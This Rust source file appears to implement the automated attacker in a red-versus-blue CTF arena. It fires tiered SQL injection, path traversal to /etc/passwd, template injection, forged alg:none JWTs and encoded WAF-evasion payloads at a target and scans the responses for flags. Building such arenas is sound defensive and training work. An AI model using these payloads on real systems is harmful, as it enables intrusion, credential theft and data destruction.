use crate::arena_target::RequestLogEntry;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

/// Result of a single Red Agent round.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RedRoundResult {
    pub flag_captured: bool,
    pub flag_value: Option<String>,
    pub requests_sent: usize,
    pub vulns_found: Vec<String>,
    pub blocked_count: usize,
    pub request_log: Vec<RequestLogEntry>,
    pub techniques_used: Vec<String>,
}

/// Attack technique descriptor.
#[derive(Debug, Clone)]
struct Attack {
    name: String,
    endpoint: String,
    method: String,
    path: String,
    headers: Vec<(String, String)>,
    body: Option<String>,
    flag_extraction: FlagExtraction,
}

/// How to extract the flag from a response.
#[derive(Debug, Clone)]
#[allow(dead_code)]
enum FlagExtraction {
    /// Search for CTF{ pattern in response body
    BodyContains,
}

/// Red Agent — the attacker side of the arena.
pub struct RedAgent {
    blocked_techniques: HashSet<String>,
}

impl RedAgent {
    pub fn new() -> Self {
        Self {
            blocked_techniques: HashSet::new(),
        }
    }

    /// Execute an attack round against the target.
    pub async fn attack(
        &mut self,
        target_url: &str,
        round: usize,
        previous_results: &[RedRoundResult],
    ) -> RedRoundResult {
        // Track which techniques were blocked in previous rounds
        for prev in previous_results {
            for entry in &prev.request_log {
                if entry.status == 403 {
                    self.blocked_techniques.insert(entry.path.clone());
                }
            }
        }

        let attacks = self.generate_attacks(target_url, round);
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(std::time::Duration::from_secs(5))
            .build()
            .unwrap_or_default();

        let mut result = RedRoundResult {
            flag_captured: false,
            flag_value: None,
            requests_sent: 0,
            vulns_found: Vec::new(),
            blocked_count: 0,
            request_log: Vec::new(),
            techniques_used: Vec::new(),
        };

        for attack in &attacks {
            let resp = self.execute_attack(&client, attack).await;
            result.requests_sent += 1;
            result.techniques_used.push(attack.name.clone());

            let (status, body) = match resp {
                Ok((s, b)) => (s, b),
                Err(_) => continue,
            };

            result.request_log.push(RequestLogEntry {
                method: attack.method.clone(),
                path: attack.endpoint.clone(),
                query_string: String::new(),
                body: attack.body.clone().unwrap_or_default(),
                status,
                response_body: body.clone(),
            });

            if status == 403 {
                result.blocked_count += 1;
                continue;
            }

            // Try to extract flag
            if let Some(flag) = extract_flag(&body) {
                result.flag_captured = true;
                result.flag_value = Some(flag);
                result.vulns_found.push(attack.name.clone());
                return result;
            }

            // Even if no flag, record vuln if we got a success indicator
            if is_vuln_indicator(status, &body) {
                result.vulns_found.push(attack.name.clone());
            }
        }

        result
    }

    /// Generate attack payloads based on round number and blocked history.
    fn generate_attacks(&self, target_url: &str, round: usize) -> Vec<Attack> {
        let mut attacks = Vec::new();
        let base = target_url.trim_end_matches('/');

        // ── Tier 1: Basic attacks (all rounds) ──
        // SQLi on /search
        attacks.extend(sqli_attacks(base));
        // LFI on /file
        attacks.extend(lfi_attacks(base));
        // IDOR on /profile
        attacks.extend(idor_attacks(base));
        // SSTI on /template
        attacks.extend(ssti_attacks(base));
        // Auth bypass on /admin + /flag
        attacks.extend(jwt_attacks(base));
        // SQLi on /login
        attacks.extend(login_sqli_attacks(base));

        // ── Tier 2: Evasion (round 3+) ──
        if round >= 3 {
            attacks.extend(encoded_sqli_attacks(base));
            attacks.extend(encoded_lfi_attacks(base));
            attacks.extend(encoded_ssti_attacks(base));
        }

        // ── Tier 3: Advanced evasion (round 5+) ──
        if round >= 5 {
            attacks.extend(advanced_sqli_attacks(base));
            attacks.extend(advanced_lfi_attacks(base));
            attacks.extend(advanced_ssti_attacks(base));
        }

        // ── Tier 4: Deep evasion (round 10+) ──
        if round >= 10 {
            attacks.extend(deep_evasion_attacks(base));
        }

        // Filter out attacks on endpoints we know are blocked
        // But still try them with evasion variants
        attacks
    }

    async fn execute_attack(
        &self,
        client: &reqwest::Client,
        attack: &Attack,
    ) -> Result<(u16, String), reqwest::Error> {
        let mut builder = match attack.method.as_str() {
            "POST" => client.post(&attack.path),
            "PUT" => client.put(&attack.path),
            _ => client.get(&attack.path),
        };

        for (key, value) in &attack.headers {
            builder = builder.header(key.as_str(), value.as_str());
        }

        if let Some(body) = &attack.body {
            builder = builder.header("content-type", "application/json").body(body.clone());
        }

        let resp = builder.send().await?;
        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();
        Ok((status, body))
    }
}

impl Default for RedAgent {
    fn default() -> Self {
        Self::new()
    }
}

// ─── Attack generators ──────────────────────────────────────────────────────

fn sqli_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        "1' OR '1'='1",
        "'; DROP TABLE users; --",
        "' OR 'a'='a",
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, payload)| Attack {
            name: format!("sqli_search_{i}"),
            endpoint: "/search".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/search?q={}", urlencoded(payload)),
            headers: vec![],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

fn lfi_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\etc\\passwd",
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, payload)| Attack {
            name: format!("lfi_file_{i}"),
            endpoint: "/file".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/file?path={}", urlencoded(payload)),
            headers: vec![],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

fn idor_attacks(base: &str) -> Vec<Attack> {
    (1..=3)
        .map(|id| Attack {
            name: format!("idor_profile_{id}"),
            endpoint: "/profile".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/profile/{id}"),
            headers: vec![],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

fn ssti_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        r#"{"template":"{{config}}"}"#,
        r#"{"template":"{{flag}}"}"#,
        r#"{"template":"{{7*7}}"}"#,
        r#"{"template":"{%import os%}{{os.environ}}"}"#,
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, body)| Attack {
            name: format!("ssti_template_{i}"),
            endpoint: "/template".to_string(),
            method: "POST".to_string(),
            path: format!("{base}/template"),
            headers: vec![],
            body: Some(body.to_string()),
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

fn jwt_attacks(base: &str) -> Vec<Attack> {
    // JWT with alg:none
    let alg_none_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.";

    vec![
        Attack {
            name: "jwt_alg_none_admin".to_string(),
            endpoint: "/admin".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/admin"),
            headers: vec![("authorization".to_string(), format!("Bearer {alg_none_token}"))],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        },
        Attack {
            name: "jwt_alg_none_flag".to_string(),
            endpoint: "/flag".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/flag"),
            headers: vec![("authorization".to_string(), format!("Bearer {alg_none_token}"))],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        },
        Attack {
            name: "jwt_admin_keyword".to_string(),
            endpoint: "/flag".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/flag"),
            headers: vec![("authorization".to_string(), "Bearer admin-token".to_string())],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        },
    ]
}

fn login_sqli_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        r#"{"username":"admin' OR '1'='1","password":"x"}"#,
        r#"{"username":"admin","password":"' OR '1'='1"}"#,
        r#"{"username":"admin'--","password":"anything"}"#,
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, body)| Attack {
            name: format!("sqli_login_{i}"),
            endpoint: "/login".to_string(),
            method: "POST".to_string(),
            path: format!("{base}/login"),
            headers: vec![],
            body: Some(body.to_string()),
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

// ── Tier 2: Encoded evasion ─────────────────────────────────────────────────

fn encoded_sqli_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        "%27%20OR%201%3D1%20--",          // URL-encoded ' OR 1=1 --
        "'+oR+1%3d1+--",                  // Mixed case + encoding
        "' /*!OR*/ 1=1 --",              // MySQL comment bypass
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, payload)| Attack {
            name: format!("encoded_sqli_{i}"),
            endpoint: "/search".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/search?q={payload}"),
            headers: vec![],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

fn encoded_lfi_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        "..%2f..%2f..%2fetc%2fpasswd",    // URL-encoded ../
        "..%252f..%252f..%252fetc%252fpasswd",  // Double-encoded
        "....//....//....//etc/passwd",     // Double-dot bypass
        "..%c0%af..%c0%af..%c0%afetc/passwd", // UTF-8 overlong
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, payload)| Attack {
            name: format!("encoded_lfi_{i}"),
            endpoint: "/file".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/file?path={payload}"),
            headers: vec![],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

fn encoded_ssti_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        r#"{"template":"\u007b\u007bconfig\u007d\u007d"}"#,   // Unicode escape
        r#"{"template":"{{ config }}"}"#,                       // Spaces
        r#"{"template":"{{''.class.mro[1].subclasses()}}"}"#,  // Jinja2 deep
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, body)| Attack {
            name: format!("encoded_ssti_{i}"),
            endpoint: "/template".to_string(),
            method: "POST".to_string(),
            path: format!("{base}/template"),
            headers: vec![],
            body: Some(body.to_string()),
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

// ── Tier 3: Advanced evasion ────────────────────────────────────────────────

fn advanced_sqli_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        "' oR 1=1 --",                       // Case variation
        "'/**/OR/**/1=1/**/--",              // Comment bypass
        "' UNION ALL SELECT NULL --",        // UNION variant
        "1;SELECT * FROM users--",           // Stacked queries
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, payload)| Attack {
            name: format!("advanced_sqli_{i}"),
            endpoint: "/search".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/search?q={}", urlencoded(payload)),
            headers: vec![],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

fn advanced_lfi_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        "/proc/self/environ",
        "....//....//etc/passwd",
        "/etc/passwd%00.jpg",               // Null byte injection
        "..;/..;/..;/etc/passwd",           // Semicolon bypass
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, payload)| Attack {
            name: format!("advanced_lfi_{i}"),
            endpoint: "/file".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/file?path={}", urlencoded(payload)),
            headers: vec![],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

fn advanced_ssti_attacks(base: &str) -> Vec<Attack> {
    let payloads = vec![
        r#"{"template":"{{self.__init__.__globals__}}"}"#,
        r#"{"template":"{% if 1 %}{{flag}}{% endif %}"}"#,
        r#"{"template":"${flag}"}"#,                         // EL injection
        r#"{"template":"{{env}}"}"#,
    ];

    payloads
        .into_iter()
        .enumerate()
        .map(|(i, body)| Attack {
            name: format!("advanced_ssti_{i}"),
            endpoint: "/template".to_string(),
            method: "POST".to_string(),
            path: format!("{base}/template"),
            headers: vec![],
            body: Some(body.to_string()),
            flag_extraction: FlagExtraction::BodyContains,
        })
        .collect()
}

// ── Tier 4: Deep evasion ────────────────────────────────────────────────────

fn deep_evasion_attacks(base: &str) -> Vec<Attack> {
    vec![
        // Double URL-encoded SQLi
        Attack {
            name: "deep_sqli_double_encode".to_string(),
            endpoint: "/search".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/search?q=%2527%2520OR%25201%253D1%2520--"),
            headers: vec![],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        },
        // Unicode normalization SSTI
        Attack {
            name: "deep_ssti_unicode".to_string(),
            endpoint: "/template".to_string(),
            method: "POST".to_string(),
            path: format!("{base}/template"),
            headers: vec![],
            body: Some(r#"{"template":"﹛﹛config﹜﹜"}"#.to_string()),
            flag_extraction: FlagExtraction::BodyContains,
        },
        // JWT with empty alg
        Attack {
            name: "deep_jwt_empty_sig".to_string(),
            endpoint: "/flag".to_string(),
            method: "GET".to_string(),
            path: format!("{base}/flag"),
            headers: vec![(
                "authorization".to_string(),
                "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.".to_string(),
            )],
            body: None,
            flag_extraction: FlagExtraction::BodyContains,
        },
    ]
}

// ─── Utility ────────────────────────────────────────────────────────────────

/// Extract a CTF{...} flag from response text.
fn extract_flag(body: &str) -> Option<String> {
    let start = body.find("CTF{")?;
    let rest = &body[start..];
    let end = rest.find('}')?;
    Some(rest[..=end].to_string())
}

/// Check if a response indicates a vulnerability was triggered.
fn is_vuln_indicator(status: u16, body: &str) -> bool {
    if status == 500 {
        return true;
    }
    let indicators = [
        "SQL Error", "syntax error", "root:x:0", "uid=0",
        "Template rendered", "Rendered:", "__class__",
        "authenticated", "Admin Control Panel",
    ];
    indicators.iter().any(|ind| body.contains(ind))
}

/// Simple URL encoding for payloads.
fn urlencoded(s: &str) -> String {
    let mut result = String::new();
    for byte in s.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                result.push(byte as char);
            }
            _ => {
                result.push_str(&format!("%{byte:02X}"));
            }
        }
    }
    result
}

// ─── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
#[path = "red_agent_test.rs"]
mod red_agent_test;
